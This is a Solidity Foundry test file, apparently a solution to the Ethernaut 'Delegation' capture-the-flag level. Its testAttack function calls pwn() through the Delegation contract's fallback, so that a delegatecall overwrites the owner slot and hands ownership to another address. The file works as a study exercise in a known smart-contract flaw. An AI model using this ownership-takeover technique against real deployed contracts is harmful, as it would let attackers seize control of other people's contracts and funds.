// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/Delegation.sol";

contract FallbackTest is Test {
    Delegate public delegate;
    Delegation public delegation;

    address alice = address(1);

    function setUp() public {
        delegate = new Delegate(address(this));
        delegation = new Delegation(address(delegate));
    }

    function testAttack() public {
        assertEq(delegation.owner(), address(this));
        vm.prank(alice);
        (bool success, /* bytes memory data */ ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "deleCall fail");
        assertEq(delegation.owner(), alice);
    }
}
